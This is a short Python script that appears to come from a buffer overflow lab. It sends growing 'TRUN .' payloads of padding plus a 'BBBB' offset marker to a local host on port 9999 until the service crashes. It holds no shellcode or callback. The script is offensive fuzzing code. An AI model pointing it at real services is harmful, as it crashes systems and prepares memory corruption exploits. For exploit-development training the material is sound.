#!/usr/bin/python3
import sys
import socket
from time import sleep

buffer = b"A" * 2006

offset = b"BBBB"

rest = b"C" * (2300 - len(buffer) - len(offset))  # Added a closing parenthesis here

while True:
    try:
        sock = socket.create_connection(('192.168.78.137', 9999))
        payload = b'TRUN .' + buffer + offset + rest
        sock.settimeout(1)
        sock.send(payload)
        sleep(1)
        sock.recv(1024)
        buffer += b"A" * 200  # Uncommented and fixed the line to increment buffer length
        print("Sending request!")
    except:
        print("Fuzzing crash at %s bytes" % str(len(buffer)))
        sys.exit()

